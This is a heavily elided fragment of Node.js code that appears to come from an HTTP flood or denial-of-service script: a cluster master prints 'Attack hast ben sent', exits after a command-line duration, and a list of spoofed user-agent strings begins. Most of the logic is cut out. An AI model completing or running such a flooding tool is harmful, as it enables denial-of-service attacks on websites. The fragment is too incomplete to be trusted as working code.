...
if (headerbuilders !== undefined) {
  ...
  if (cluster.isMaster) {
    ...
    ;
    console.log("[32mAttack hast ben sent");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1e3);
  } else {
...
const UAs = ["AdsBot-Google ( http://www.google.com/adsbot.html)",
